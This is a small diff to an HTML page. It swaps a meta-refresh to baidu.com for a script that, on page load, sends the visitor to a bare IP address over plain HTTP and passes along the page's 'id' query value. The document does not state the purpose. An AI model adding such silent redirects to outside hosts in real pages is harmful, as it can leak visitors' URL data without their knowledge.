@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <html>
-    <head>
-        <meta http-equiv="refresh" content="0;url=https://www.baidu.com">
-    </head>
+	<head>
+		<script type="text/javascript">
+			window.onload = function() {
+				var searchParams = new URLSearchParams(window.location.search);
+				window.location.href = "http://49.235.151.78?id=" + searchParams.get('id');
+			};
+		</script>
+	</head>
 </html>
